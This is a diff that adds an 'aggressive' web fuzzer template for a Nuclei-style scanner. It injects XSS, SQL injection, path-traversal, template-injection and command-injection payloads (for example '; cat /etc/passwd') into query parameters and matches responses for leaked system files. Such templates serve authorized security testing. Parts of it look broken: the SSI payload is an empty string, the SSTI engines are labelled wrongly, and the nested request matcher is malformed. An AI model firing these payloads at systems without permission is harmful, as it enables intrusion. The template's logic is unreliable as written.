@@ -1,0 +1,73 @@
+id: boltr-universal-fuzzer
+
+info:
+  name: BoltR Universal Aggressive Fuzzer
+  author: BoltR_User
+  severity: critical
+  description: |
+    A single-shot aggressive fuzzer that injects polyglots into all parameters to trigger SQLi, XSS, LFI, SSTI, or RCE errors.
+  tags: fuzzer, intrusive, critical, boltr
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      fuzz_payloads:
+        - "'\"<sCRipt>alert(1)</sCRipt>"  # Basic XSS
+        - "' OR '1'='1"                   # Basic SQLi
+        - "../../../../../etc/passwd"     # Basic LFI
+        - "${7*7}"                        # SSTI (Twig/Jinja)
+        - "{{7*7}}"                       # SSTI (Mustache)
+        - "; cat /etc/passwd"             # RCE (*nix)
+        - "| type C:\\Windows\\win.ini"   # RCE (Windows)
+        - ""       # SSI Injection
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{fuzz_payloads}}"
+
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      # 1. SQL Injection Errors
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch_array"
+          - "ORA-01756"
+          - "SQLite/JDBCDriver"
+          - "System.Data.SqlClient.SqlException"
+        part: body
+
+      # 2. LFI / RCE Success Indicators
+      - type: regex
+        regex:
+          - "root:x:0:0"
+          - "\\[(font|extension|file)s\\]"  # win.ini
+          - "uid=[0-9]+.*gid=[0-9]+"
+        part: body
+
+      # 3. XSS Reflection (Aggressive)
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+        part: body
+
+      # 4. SSTI (Calculation Confirmation)
+      - type: word
+        words:
+          - "49"
+        part: body
+        condition: and
+        matchers:
+          - type: word
+            words:
+              - "{{7*7}}"
+              - "${7*7}"
+            part: request # Ensure we actually sent the payload
+            negative: true
